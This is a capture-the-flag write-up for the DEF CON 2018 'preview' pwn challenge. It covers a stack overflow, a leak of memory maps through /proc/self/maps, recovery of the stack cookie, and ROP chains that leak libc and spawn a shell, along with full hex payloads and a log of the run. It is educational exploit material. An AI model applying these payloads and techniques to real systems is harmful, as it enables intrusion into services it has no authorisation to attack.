# Preview

Category: Pwn

In this challenge, are given a [binary](./preview/preview) `preview` and the corresponding [libc](./preview/libc.so.6). So at least it isn't blind this time around.

We open it up in IDA, and we notice that there's some funky `mmap`-ing going on, and it jumps to the `mmap`ed region.

In GDB, we notice that the actual functionality of the program we observe over nc doesn't happen inside the code segment of the `preview` binary, so we deduce that it must be manually mapping a stage2 for the actual chal functionality.

To take care of that, we can use the `vmmap` command in pwndbg and do a memory dump of the mapped segments to get a [binary](./preview/a) for the real code.

There's a pretty obvious stack overflow for reading the command from the user, where the buffer is only 88 bytes big, but the read is 256 bytes in `process_command`.

We don't know the location that our stage2 is manual mapped at, but luckily on the remote server (and locally) we can do `HEAD /proc/self/maps` to leak it. That bypasses ASLR.

At this point, we were stuck for a long time because of the stack cookie.
However, after some experimentation and staring at `vmmap` in pwndbg, we noticed that the stack cookie is equal to `(base of ld.so << 24) | (base of stage2 >> 4)`!

So now, it's quite trivial to write a ROPchain to leak libc and ret2libc.

```
+0x00 "HEAD "
+0x05 padding
+0x58 saved rbp
+0x60 pop rdi; ret gadget
+0x68 puts@got - value used to leak libc
+0x70 puts@plt - return address from previous gadget
+0x78 main - return address from puts@plt ; stage2 of exploit
```

At this point we have leaked libc and we are back in main safe and sound, which means we can just do the overflow once more to ret2libc.

```
+0x00 "HEAD "
+0x05 padding
+0x58 saved rbp
+0x60 execve(/bin/sh) in libc
```

Output:
```
[x] Opening connection to cee810fa.quals2018.oooverflow.io on port 31337
[x] Opening connection to cee810fa.quals2018.oooverflow.io on port 31337: Trying 52.52.107.212
[+] Opening connection to cee810fa.quals2018.oooverflow.io on port 31337: Done
Solving challenge: "ivNoWSyZYl", n: 22
[x] Starting local process './fastpow'
[+] Starting local process './fastpow': pid 32272
Solution: 849294 -> e91045e7af51404a3a6343074f021b15c32a7087ffa867fcb3942f36f9400000
[DEBUG] Sent 0x15 bytes:
    'HEAD /proc/self/maps\n'
[DEBUG] Received 0x16 bytes:
    'Welcome to preview 0.1'
[DEBUG] Received 0x1cc bytes:
    '\n'
    'Standing by for your requests\n'
    "Here's your preview:\n"
    'b41006a000-b410090000 r-xp 00000000 ca:01 1969                           /lib/x86_64-linux-gnu/ld-2.23.so\n'
    'b41028f000-b410290000 r--p 00025000 ca:01 1969                           /lib/x86_64-linux-gnu/ld-2.23.so\n'
    'b410290000-b410291000 rw-p 00026000 ca:01 1969                           /lib/x86_64-linux-gnu/ld-2.23.so\n'
    'b410291000-b410292000 rw-p 00000000 00:00 0 \n'
    'fc9b47d000-fc9b47f000 r-xp 00000000 00:00 0 \n'
stack cookie = b41006afc9b47d00
break *0xfc9b47dfd6
[DEBUG] Sent 0xfb bytes:
    00000000  48 45 41 44  20 00 00 00  00 00 00 00  00 00 00 00  │HEAD│ ···│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  00 7d b4 c9  af 06 10 b4  │····│····│·}··│····│
    00000060  00 00 00 00  00 00 00 00  b3 e0 47 9b  fc 00 00 00  │····│····│··G·│····│
    00000070  20 f0 67 9b  fc 00 00 00  e0 d9 47 9b  fc 00 00 00  │ ·g·│····│··G·│····│
    00000080  e8 df 47 9b  fc 00 00 00  00 00 00 00  00 00 00 00  │··G·│····│····│····│
    00000090  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000f0  00 00 00 00  00 00 00 00  00 00 0a                  │····│····│···│
    000000fb
[DEBUG] Received 0x5a bytes:
    'fc9b67e000-fc9b67f000 r--p 00000000 00:00 0 \n'
    'fc9b67f000-fc9b680000 rw-p 00000000 00:00 0 \n'
[DEBUG] Received 0x4f bytes:
    00000000  52 65 73 6f  75 72 63 65  20 6e 6f 74  20 66 6f 75  │Reso│urce│ not│ fou│
    00000010  6e 64 0a 90  96 f3 9c 4b  7f 0a 57 65  6c 63 6f 6d  │nd··│···K│··We│lcom│
    00000020  65 20 74 6f  20 70 72 65  76 69 65 77  20 30 2e 31  │e to│ pre│view│ 0.1│
    00000030  0a 53 74 61  6e 64 69 6e  67 20 62 79  20 66 6f 72  │·Sta│ndin│g by│ for│
    00000040  20 79 6f 75  72 20 72 65  71 75 65 73  74 73 0a     │ you│r re│ques│ts·│
    0000004f
fc9b67e000-fc9b67f000 r--p 00000000 00:00 0 
fc9b67f000-fc9b680000 rw-p 00000000 00:00 0 
Resource not found

puts@got = 00007f4b9cf39690
[DEBUG] PLT 0x1f7f0 realloc
[DEBUG] PLT 0x1f800 __tls_get_addr
[DEBUG] PLT 0x1f820 memalign
[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
[DEBUG] PLT 0x1f870 calloc
[DEBUG] PLT 0x1f8a0 malloc
[DEBUG] PLT 0x1f8a8 free
[*] '/home/user/ctf/defcon/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc = 00007f4b9ceca000
[DEBUG] Sent 0xfb bytes:
    00000000  48 45 41 44  20 00 00 00  00 00 00 00  00 00 00 00  │HEAD│ ···│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  00 7d b4 c9  af 06 10 b4  │····│····│·}··│····│
    00000060  00 00 00 00  00 00 00 00  16 f2 f0 9c  4b 7f 00 00  │····│····│····│K···│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000f0  00 00 00 00  00 00 00 00  00 00 0a                  │····│····│···│
    000000fb
[DEBUG] Received 0x12 bytes:
    'Resource not found'
[DEBUG] Received 0x1 bytes:
    '\n'

Welcome to preview 0.1
Standing by for your requests
Resource not found

[*] Switching to interactive mode
[DEBUG] Sent 0x1 bytes:
    'l' * 0x1
[DEBUG] Sent 0x1 bytes:
    's' * 0x1
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[DEBUG] Received 0x5 bytes:
    'flag\n'
flag
[DEBUG] Sent 0x1 bytes:
    'c' * 0x1
[DEBUG] Sent 0x1 bytes:
    'a' * 0x1
[DEBUG] Sent 0x1 bytes:
    't' * 0x1
[DEBUG] Sent 0x1 bytes:
    ' ' * 0x1
[DEBUG] Sent 0x1 bytes:
    'f' * 0x1
[DEBUG] Sent 0x1 bytes:
    'l' * 0x1
[DEBUG] Sent 0x1 bytes:
    'a' * 0x1
[DEBUG] Sent 0x1 bytes:
    'g' * 0x1
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[DEBUG] Received 0x44 bytes:
    'OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}\n'
OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}
[*] Process './fastpow' stopped with exit code 0 (pid 32272)
[*] Closed connection to cee810fa.quals2018.oooverflow.io port 31337
```

[Final exploit script](./preview/preview.py)
